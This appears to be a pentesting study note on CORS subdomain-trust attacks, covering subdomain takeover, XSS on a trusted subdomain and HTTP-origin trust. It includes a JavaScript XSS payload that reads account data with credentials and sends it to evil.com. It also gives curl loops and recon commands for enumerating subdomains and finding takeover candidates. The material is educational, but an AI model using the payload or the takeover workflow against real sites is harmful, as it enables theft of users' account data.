---
tags: [vapt, cors, intermediate]
difficulty: intermediate
module: "12 - CORS"
topic: "12.07 Subdomain Trust"
portswigger_labs: ["CORS vulnerability with trusted insecure protocols"]
---

# 12.07 — Subdomain Trust

## What Is Subdomain Trust?

```
WHEN DEVELOPERS TRUST SUBDOMAINS:
  Legitimate use: app.target.com → api.target.com → CORS allowed
  
  But sometimes developers trust ALL subdomains:
  Access-Control-Allow-Origin: *.target.com  ← not all browsers support this!
  
  OR reflect origin if it ends with .target.com:
  if (origin.endsWith('.target.com')) allow();
  
  RISK:
  - Subdomain takeover: attacker.target.com → attacker controls it!
  - XSS on any subdomain: sub.target.com has XSS
  - Any subdomain trusted → use that subdomain to attack the main domain!
```

---

## Attack Vector 1 — Subdomain Takeover + CORS

```
WHAT IS SUBDOMAIN TAKEOVER?
  Some subdomains point to third-party services via CNAME:
  uploads.target.com → CNAME → s3-bucket.s3.amazonaws.com
  
  If the S3 bucket is deleted/abandoned:
  → uploads.target.com still resolves
  → But the S3 bucket doesn't exist!
  → Attacker creates that S3 bucket → controls uploads.target.com!

CORS CHAIN:
  1. Find that target.com trusts *.target.com OR ends-with check
  2. Find abandoned subdomain: old.target.com (CNAME to cloud service)
  3. Claim the cloud resource → now attacker controls old.target.com
  4. Host CORS attack page on old.target.com
  5. old.target.com is trusted → ACAO: https://old.target.com + ACAC: true
  6. Attack reads victim's data from target.com/api!

FINDING SUBDOMAINS:
  subfinder -d target.com -o subdomains.txt
  amass enum -d target.com
  
  CHECK EACH FOR DANGLING CNAME:
  cat subdomains.txt | while read sub; do
    result=$(dig $sub CNAME +short)
    if [ -n "$result" ]; then
      echo "$sub → CNAME: $result"
    fi
  done
```

---

## Attack Vector 2 — XSS on Trusted Subdomain

```
SCENARIO:
  api.target.com trusts CORS from uploads.target.com
  uploads.target.com has a stored XSS vulnerability
  
  CHAIN:
  1. Attacker stores XSS payload on uploads.target.com:
     https://uploads.target.com/image/profile → XSS in filename/metadata
  
  2. XSS payload on uploads.target.com makes fetch to api.target.com:
     fetch('https://api.target.com/account', {credentials: 'include'})
       .then(r => r.json())
       .then(data => fetch('https://evil.com/steal', {body: JSON.stringify(data)}))
  
  3. uploads.target.com is trusted by api.target.com
  4. ACAO: https://uploads.target.com + ACAC: true
  5. XSS reads the API response!
  6. Data exfiltrated to evil.com!

WHY THIS WORKS:
  Same-site restriction: API cookies sent to api.target.com from uploads.target.com
  (same-site = same eTLD+1 = both target.com)
  CORS allows the read because origin is trusted!
  
  XSS + CORS = data theft from entire same-site domain!
```

---

## Attack Vector 3 — HTTP Subdomain Trusted by HTTPS Site

```
SCENARIO:
  https://target.com API trusts: http://sub.target.com
  (developer tests locally over HTTP, forgot to remove)
  
  Access-Control-Allow-Origin: http://sub.target.com
  Access-Control-Allow-Credentials: true
  
  RISK:
  If attacker can MITM the HTTP connection to sub.target.com:
  → Insert their own JavaScript
  → JavaScript makes credentialed CORS request to api.target.com
  → Data read!
  
  ALSO:
  Any cafe/hotel WiFi network can MITM HTTP!
  
DETECTION:
  curl -v -H "Origin: http://sub.target.com" \
    -H "Cookie: session=YOURS" https://target.com/api/account
  → If ACAO: http://sub.target.com → vulnerable to HTTP MITM!
```

---

## Finding Trusted Subdomains in CORS Config

```bash
# TEST VARIOUS SUBDOMAINS:
domains=(
  "sub.target.com"
  "app.target.com"
  "api.target.com"
  "dev.target.com"
  "staging.target.com"
  "uploads.target.com"
  "cdn.target.com"
  "test.target.com"
  "beta.target.com"
  "admin.target.com"
)

for domain in "${domains[@]}"; do
  result=$(curl -s -I \
    -H "Origin: https://$domain" \
    -H "Cookie: session=YOUR_SESSION" \
    "https://target.com/api/account" | grep -i "access-control-allow-origin")
  echo "$domain → $result"
done

# IF ANY RETURNS ACAO MATCHING THE TESTED SUBDOMAIN:
# 1. Check if that subdomain is vulnerable (XSS, takeover)
# 2. If yes → CORS trust chain is exploitable!

# ALSO TEST HTTP VERSIONS:
curl -s -I -H "Origin: http://sub.target.com" \
  -H "Cookie: session=YOURS" https://target.com/api/account | grep -i access-control
```

---

## Identifying Takeover-Vulnerable Subdomains

```bash
# STEP 1: ENUMERATE SUBDOMAINS:
subfinder -d target.com | tee subdomains.txt

# STEP 2: CHECK WHICH ONES RESOLVE:
cat subdomains.txt | httpx -silent | tee resolved.txt

# STEP 3: CHECK FOR DANGLING CNAMEs:
cat subdomains.txt | while read sub; do
  cname=$(dig +short CNAME $sub 2>/dev/null)
  if [ -n "$cname" ]; then
    # Check if destination exists
    if ! host $cname &>/dev/null; then
      echo "[POTENTIAL TAKEOVER] $sub → $cname (not resolving!)"
    fi
  fi
done

# STEP 4: USE NUCLEI FOR TAKEOVER DETECTION:
nuclei -l subdomains.txt -t subdomain-takeover/ -o takeovers.txt

# STEP 5: CROSS-REFERENCE WITH CORS TRUST:
# Check which takeover candidates are trusted by target.com's CORS config
```

---

## Related Notes
- [[04 - Origin Reflection Misconfiguration]] — origin reflection basics
- [[05 - Null Origin Misconfiguration]] — null origin
- [[08 - Regex Bypass]] — weak regex for domain matching
- [[09 - CORS to Credential Theft]] — full exploit chain
- [[12 - Defense Strict Origin Whitelisting]] — how to fix
